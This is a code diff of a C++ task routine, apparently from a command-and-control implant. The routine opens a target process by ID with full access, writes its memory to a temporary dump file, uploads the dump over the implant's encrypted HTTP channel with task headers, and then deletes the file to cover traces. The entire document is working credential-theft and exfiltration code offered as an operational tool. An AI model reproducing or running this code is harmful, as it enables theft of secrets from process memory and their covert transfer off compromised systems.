@@ -2,28 +2,35 @@
 
 namespace Task
 {
+    // There is no Native API to memory dump, so use WINAPIs for all process.
     std::wstring Procdump(State::PSTATE pState, const std::wstring& wPid)
     {
-        HANDLE hProcess;
         DWORD dwPid = Utils::Convert::WstringToDWORD(wPid, 10);
         // std::wstring wDumpFilePath = L"tmp.dmp";
-        std::wstring wDumpFilePath = System::Env::GetStrings(pState->pProcs, L"%TEMP%") + L"\\tmp.dmp";
+        std::wstring wDumpFilePath = System::Env::EnvStringsGet(pState->pProcs, L"%TEMP%") + L"\\tmp.dmp";
 
-        HANDLE hFile = System::Fs::CreateNewFile(
-            pState->pProcs,
-            wDumpFilePath.c_str()
+        HANDLE hFile = CreateFile(
+            wDumpFilePath.c_str(),
+            GENERIC_ALL,
+            0,
+            NULL,
+            CREATE_ALWAYS,
+            FILE_ATTRIBUTE_NORMAL,
+            NULL
         );
         if (hFile == INVALID_HANDLE_VALUE)
         {
             return L"Error: Could not create a file to dump.";
         }
 
-        if (!System::Process::ProcessOpen(pState->pProcs, dwPid, PROCESS_ALL_ACCESS))
+        HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, 0, dwPid);
+        if (!hProcess)
         {
-            pState->pProcs->lpNtClose(hFile);
+            CloseHandle(hFile);
             return L"Error: Could not open process.";
         }
 
+        // Dump
         if (!MiniDumpWriteDump(
             hProcess,
             dwPid,
@@ -33,13 +40,13 @@ namespace Task
             NULL,
             NULL
         )) {
-            pState->pProcs->lpNtClose(hFile);
-            pState->pProcs->lpNtClose(hProcess);
-            return L"Error: Could not dump the process.";
+            CloseHandle(hFile);
+            CloseHandle(hProcess);
+            return L"Error: Failed to dump the process memory.";
         }
 
-        pState->pProcs->lpNtClose(hFile);
-        pState->pProcs->lpNtClose(hProcess);
+        CloseHandle(hFile);
+        CloseHandle(hProcess);
 
         // Upload a dumped file.
         std::wstring wHeaders = L"";
@@ -47,7 +54,7 @@ namespace Task
         wHeaders += L"X-TASK: " + pState->wTask + L"\r\n";
         wHeaders += L"X-FILE: procdump\r\n";
 
-        if (!System::Http::UploadFile(
+        if (!System::Http::FileUpload(
             pState->pProcs,
             pState->pCrypt,
             pState->hConnect,
@@ -57,8 +64,12 @@ namespace Task
             wHeaders.c_str(),
             wDumpFilePath
         )) {
+            DeleteFile(wDumpFilePath.c_str());
             return L"Error: Could not upload the dump file.";
         }
+
+        // Delete temp dump file
+        DeleteFile(wDumpFilePath.c_str());
 
         return wDumpFilePath.c_str();
     }
